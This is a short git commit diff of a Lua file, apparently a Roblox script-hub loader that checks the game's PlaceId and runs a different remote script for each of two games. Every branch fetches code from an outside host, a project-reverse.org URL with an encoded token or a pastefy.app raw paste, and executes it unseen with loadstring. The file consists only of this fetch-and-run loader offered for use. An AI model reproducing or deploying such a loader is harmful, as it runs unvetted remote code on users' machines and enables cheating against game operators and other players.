09db699022db665380f70e1bd3492ca74096719a
xeroxson <artekty2@gmail.com>
2026-04-01 20:06:25 +0400

    Xhub.lua

--- Xhub.lua
+++ Xhub.lua
@@ -1,2 +1,6 @@
+if game.PlaceId == 142823291 then
 loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImMwNmY5ZDhlLTY3NzctNDcyYy04ZjMwLWU3MThlZGIwM2MyOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
-loadstring(game:HttpGet("https://pastefy.app/uaGyYqgk/raw"))()
+end
+if game.PlaceId == 920587237 then
+loadstring(game:HttpGet("https://pastefy.app/ANckHmQE/raw"))()
+end
